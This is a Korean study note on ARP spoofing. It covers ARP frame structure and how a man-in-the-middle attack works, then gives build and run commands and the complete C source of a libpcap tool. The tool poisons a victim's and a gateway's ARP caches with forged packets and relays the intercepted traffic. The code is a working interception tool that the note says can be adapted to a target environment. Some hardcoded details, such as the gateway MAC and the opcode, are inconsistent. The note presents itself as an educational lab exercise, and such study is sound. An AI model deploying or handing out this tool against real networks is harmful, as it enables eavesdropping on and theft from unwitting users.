---
title: "\"[프로젝트] ARP Spoofing 구현 - MITM 공격 이해와 C 구현\""
tags: [학습, 보안, 네트워크, C, ARP-Spoofing]
created: 2026-09-05
modified: 2026-09-05
---

# ARP Spoofing 구현 - MITM 공격 이해와 C 구현

> [!NOTE]
> ARP 프로토콜의 동작 원리와 MITM(중간자 공격) 성립 과정을 학습하고, `libpcap` 기반 멀티스레드로 ARP Spoofing 툴을 직접 구현한 네트워크 보안 학습 프로젝트다.

> ⚠️ **교육 목적 전용**: 본인 소유이거나 명시적으로 테스트 허가를 받은 네트워크 환경(사설 테스트 랩)에서만 사용해야 한다. 타인의 네트워크에 무단으로 사용하는 것은 불법이다.

## 🧱 기술 스택
- C, `libpcap` (패킷 캡처 / BPF 필터 / 패킷 주입)
- `pthread` (멀티스레드)

## ⚙️ 구현
- **작업결과물**: [GitHub - sweetpark/arp_spoofing_tool](https://github.com/sweetpark/arp_spoofing_tool)

### 목적
ARP 프로토콜의 동작 원리와 취약점을 이해하고, ARP Spoofing이 어떻게 MITM(중간자 공격)으로 이어지는지 직접 구현하며 확인한다.

### 참고자료
- [ARP 동작 과정을 패킷트레이서로 구경하기](https://www.youtube.com/watch?v=Nw4dNyh1dUY)
- [ARP Spoofing(스푸핑) 개념을 알아보기](https://www.youtube.com/watch?v=E6458qelSco)
- [C/libpcap ARP Spoofing 정리 (tistory)](https://py0zz1.tistory.com/m/6)

### Ethernet + ARP 프레임 구조 (14byte + 28byte)

Untagged Ethernet II(DIX 2.0) 캡슐화 기준으로, ARP 패킷은 아래와 같이 6바이트 목적지/출발지 MAC, 2바이트 EtherType 뒤에 28바이트 ARP 헤더가 이어지는 구조다.

```
Ethernet II Header (14B)                         ARP Header (28B)
+-------+-------+-------+   +------+------+------+------+------+------+------+------+
| DA_MAC| SA_MAC| EType |   | HRD  | PROTO| HLEN | PLEN | OP   | SHA  | SPA  | THA/TPA |
| 6B    | 6B    | 2B    |   | 2B   | 2B   | 1B   | 1B   | 2B   | 6B   | 4B   | 6B/4B   |
+-------+-------+-------+   +------+------+------+------+------+------+------+------+
```

- `DA_MAC` / `SA_MAC`: 이더넷 목적지/출발지 MAC 주소 (각 6B)
- `EType`: 상위 프로토콜 타입 (ARP인 경우 `0x0806`)
- `HRD`(Hardware Type): 이더넷이면 `0x0001`
- `PROTO`(Protocol Type): IPv4면 `0x0800`
- `HLEN`/`PLEN`: 하드웨어 주소 길이(6), 프로토콜 주소 길이(4)
- `OP`(Opcode): request(`1`) / reply(`2`)
- `SHA`/`SPA`/`THA`/`TPA`: Sender/Target의 Hardware(MAC)·Protocol(IP) 주소

### ARP Spoofing 공격 개념 (네트워크 구성 예시)

같은 세그먼트(허브/스위치)에 Victim, Attacker, Gateway(Server)가 함께 있는 환경을 가정하면, ARP에는 인증 절차가 없다는 점을 이용해 공격자가 양쪽에 조작된 ARP 응답을 지속적으로 흘려보내 각 호스트의 ARP 캐시를 오염시킬 수 있다.

```
[Victim]  <───────────>  [Attacker]  <───────────>  [Gateway/Server]
             (정상 경로처럼 보이지만 실제로는 Attacker를 경유)
```

1. Victim에게 "Gateway의 MAC은 나(Attacker)다"라는 위조 ARP 응답을 주기적으로 전송한다.
2. Gateway에게 "Victim의 MAC은 나(Attacker)다"라는 위조 ARP 응답을 주기적으로 전송한다.
3. 양쪽 ARP 캐시가 오염되면서 Victim ↔ Gateway 간 모든 트래픽이 Attacker를 경유하게 된다.
4. Attacker는 가로챈 패킷을 그대로 릴레이(relay)해 통신 장애 없이 스니핑을 지속한다.

### ARP 프로토콜 이론 / MITM 원리 / 탐지·방어 기법

ARP 동작 원리, ARP Spoofing으로 MITM이 성립하는 과정, ARP 패킷 구조, libpcap 개요, 탐지/방어 기법(대부분 재사용 가능한 일반 보안 지식)은 별도 노트로 분리해 정리했다.

→ (CS) ARP 프로토콜과 ARP Spoofing(MITM) 이론 - 핵심 개념 및 특징 정리 (개인 학습노트)

## 🔧 빌드 및 실행

```bash
# Ubuntu 20.04 LTS 기준
sudo apt-get install libpcap-dev

gcc -o arp_spoofing_tool arp_spoofing.c -lpcap -lpthread
sudo ./arp_spoofing_tool [VICTIM_IP]
```

실행 시 사용 가능한 네트워크 인터페이스 목록이 출력되고, 번호를 입력해 스니핑에 사용할 디바이스를 선택하는 방식으로 동작한다.

## 부록: 소스코드 (ARP Spoofing 구현 — C)

> [!NOTE]
> 아래는 이 프로젝트에서 직접 작성해 GitHub에 공개한 구현 코드다(하드코딩된 MAC/IP는 VM 기반 사설 테스트 랩 환경의 값이며, 실제 사용 시에는 대상 환경에 맞게 교체해야 한다).

```c
#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>

#define BUF_SIZE 100
#define SNAPLEN 1024

//전역변수로 생성
pcap_t *use_dev;

// 첫번째 Thread VICTIM 담당 (희생자 pc에게 자신의 mac 주소 삽입(오염))
void *Arp_send_VICTIM(void *arg)
{

    unsigned char packet[100]={0,};
        //Destination Address MAC
        packet[0] = 0x00;
        packet[1] = 0x0c;
        packet[2] = 0x29;
        packet[3] = 0x8a;
        packet[4] = 0x9c;
        packet[5] = 0xbd;

        //Source Address MAC
        packet[6] = 0x00;
        packet[7] = 0x0c;
        packet[8] = 0x29;
        packet[9] = 0xcc;
        packet[10] = 0x30;
        packet[11] = 0x10;

        //ether_type (ARP로 설정)
        packet[12] = 0x08;
        packet[13] = 0x06;

        //hrd_type (Ethernet로 설정)
        packet[14] = 0x00;
        packet[15] = 0x01;

        //proto_type (IPv4 로 설정)
        packet[16] = 0x08;
        packet[17] = 0x00;

        //hrd_size (6)
        packet[18] = 0x06;
        //proto_size (4)
        packet[19] = 0x04;

        //Opcode (request)
        packet[20] = 0x00;
        packet[21] = 0x01;

        // Sender MAC (My mac)
        packet[22] = 0x00;
        packet[23] = 0x0c;
        packet[24] = 0x29;
        packet[25] = 0xcc;
        packet[26] = 0x30;
        packet[27] = 0x10;
        //Sender IP (MY ip)
        packet[28] = 192;
        packet[29] = 168;
        packet[30] = 114;
        packet[31] = 137;

        //Target MAC
        packet[32] = 0x00;
        packet[33] = 0x0c;
        packet[34] = 0x29;
        packet[35] = 0x8a;
        packet[36] = 0x9c;
        packet[37] = 0xbd;
        //Target IP
        packet[38] = 192;
        packet[39] = 168;
        packet[40] = 114;
        packet[41] = 138;

        while(1)
        {
            if(pcap_sendpacket(use_dev,packet,42)!=0)
            {
                printf("SEND PACKET ERROR!\n");
                pthread_exit(NULL);
            }
            printf("VICTIM_ARP\n");
            sleep(1);
        }
    pthread_exit(NULL);

}

//두번째 Thread GATEWAY(server) 담당 (희생자 패킷정보 확인 후 gateway에게 패킷전달(오염))
void *Arp_send_GATEWAY(void *arg)
{
    unsigned char packet[100]={0,};
        //Destination Address MAC
        packet[0] = 0x00;
        packet[1] = 0x0c;
        packet[2] = 0x29;
        packet[3] = 0xf0;
        packet[4] = 0xbb;
        packet[5] = 0x01;

        //Source Address MAC
        packet[6] = 0x00;
        packet[7] = 0x0c;
        packet[8] = 0x29;
        packet[9] = 0xcc;
        packet[10] = 0x30;
        packet[11] = 0x10;

        //ether_type (ARP로 설정)
        packet[12] = 0x08;
        packet[13] = 0x06;

        //hrd_type (Ethernet로 설정)
        packet[14] = 0x00;
        packet[15] = 0x01;

        //proto_type (IPv4 로 설정)
        packet[16] = 0x08;
        packet[17] = 0x00;

        //hrd_size (6)
        packet[18] = 0x06;
        //proto_size (4)
        packet[19] = 0x04;

        //Opcode (request)
        packet[20] = 0x00;
        packet[21] = 0x01;

        // Sender MAC (My mac)
        packet[22] = 0x00;
        packet[23] = 0x0c;
        packet[24] = 0x29;
        packet[25] = 0xcc;
        packet[26] = 0x30;
        packet[27] = 0x10;
        //Sender IP (MY ip)
        packet[28] = 192;
        packet[29] = 168;
        packet[30] = 114;
        packet[31] = 137;

        //Target MAC
        packet[32] = 0x00;
        packet[33] = 0x0c;
        packet[34] = 0x29;
        packet[35] = 0xf0;
        packet[36] = 0xbb;
        packet[37] = 0x01;
        //Target IP
        packet[38] = 192;
        packet[39] = 168;
        packet[40] = 114;
        packet[41] = 139;

        while(1)
        {
            if(pcap_sendpacket(use_dev,packet,42)!=0)
            {
                printf("SEND PACKET ERROR!\n");
                pthread_exit(NULL);
            }
            printf("GATEWAY_ARP\n");
            sleep(1);
        }
    pthread_exit(NULL);
}

//Thread 생성하는 함수
void Thread_up()
{
    pthread_t threads[2];
    if((pthread_create(&threads[0],NULL,&Arp_send_VICTIM,NULL))!=0)
    {
        printf("ERROR\n");
    }
    if((pthread_create(&threads[1],NULL,&Arp_send_GATEWAY,NULL))!=0)
    {
        printf("ERROR\n");
    }
}

//장치 설정하는 함수
void init_dev(char **dev)
{
    pcap_if_t *alldev, *device;
    char errbuf[100] , *devname , devs[100][100];
	int count = 1 , n;
    if(pcap_findalldevs(&alldev,errbuf))
    {
		printf("Error finding devices : %s" , errbuf);
		exit(1);
	}
    printf("\nAvailable Devices are :\n");
	for(device = alldev ; device != NULL ; device = device->next)
	{
		printf("%d. %s - %s\n" , count , device->name , device->description);
		if(device->name != NULL)
		{
			strcpy(devs[count] , device->name);
		}
		count++;
	}

    printf("Enter the number of the device you want to sniff : ");
	scanf("%d" , &n);
	devname = devs[n];

    use_dev = pcap_open_live(devname, BUFSIZ, 1, 1,errbuf);

    if(use_dev == NULL)
    {
        printf("%s\n",errbuf);
        exit(1);
    }

    return;
}

//필터룰 설정하는 함수
void set_filter(char *filter, char *victim_ip)
{
    struct bpf_program fp;

    printf("SET FILTERING...\n");
    strcat(filter,"host ");
    strcat(filter,victim_ip);
    printf("SET FILTER :: %s\n",filter);

    if(pcap_compile(use_dev,&fp,filter,SNAPLEN,1)<0)
    {
        printf("COMPILE ERROR!\n");
        exit(1);
    }
    if(pcap_setfilter(use_dev,&fp)<0)
    {
        printf("SETFILET ERROR!\n");
        exit(1);
    }
    return;
}
//loop함수-callback함수(패킷 릴레이처리해주는 부분)
void callback(unsigned char *param,const struct pcap_pkthdr *header,const unsigned char *pkt_data)
{
    struct ether_header *eh = (struct ether_header *)pkt_data;
    printf("Callbakc :: In\n");

    unsigned char VICTIM_MAC[6] = {0x00,0x0c,0x29,0x8a,0x9c,0xbd};
    unsigned char ATTACK_MAC[6] = {0x00,0x0c,0x29,0xcc,0x30,0x10};
    unsigned char GATEWAY_MAC[6] = {0x00,0x0c,0x29,0xff,0xbb,0x01};
    //Victim request -> Attack pc packet
    if((memcmp(VICTIM_MAC,eh->ether_shost,sizeof(eh->ether_shost)))==0)
    {
        printf("VICTIM -> GATEWAY\n");
        memcpy(eh->ether_shost,ATTACK_MAC,sizeof(eh->ether_shost)); // victim pc -> attack pc
        memcpy(eh->ether_dhost,GATEWAY_MAC,sizeof(eh->ether_dhost)); // attack pc -> gateway
    }
    //Gateway reply -> Attack pc packet
    if((memcmp(GATEWAY_MAC,eh->ether_shost,sizeof(eh->ether_shost)))==0)
    {
        printf("GATEWAY -> VICTIM\n");
        memcpy(eh->ether_shost,ATTACK_MAC,sizeof(eh->ether_shost)); //attack pc로 이동
        memcpy(eh->ether_dhost,VICTIM_MAC,sizeof(eh->ether_dhost)); // attack pc -> victim pc
    }

    pcap_sendpacket(use_dev,pkt_data,header->caplen);
}

int main(int argc, char **argv)
{
    char *dev;
    char filter[BUF_SIZE]={0,};
    char victim_ip[BUF_SIZE]={0,};

    //인자값으로 VICTIM_IP 받음
    if(argv[1])
    {
        strcpy(victim_ip,argv[1]);
    }
    else
    {
        printf("Please enter the Victim_IP\n");
        return 1;
    }
    //디바이스 설정
    init_dev(&dev);
    //필터 설정
    set_filter(filter,victim_ip);
    //Thread 생성
    Thread_up();
    // Packet Start
    pcap_loop(use_dev,0,callback,NULL);
    pcap_close(use_dev);

    return 0;

}
```

### 구현 포인트
- `libpcap`으로 네트워크 인터페이스에서 직접 패킷을 캡처/전송한다.
- Victim ↔ Gateway 양방향 스푸핑을 각각 별도 스레드(`pthread`)로 분리해 동시에 처리한다.
- ARP 패킷을 바이트 배열로 직접 구성한다(Ethernet 헤더 + ARP 헤더를 수동으로 조립).
- `callback()`에서 캡처된 패킷의 출발지 MAC을 검사해 Victim ↔ Gateway 간 트래픽을 Attacker 경유로 릴레이한다.
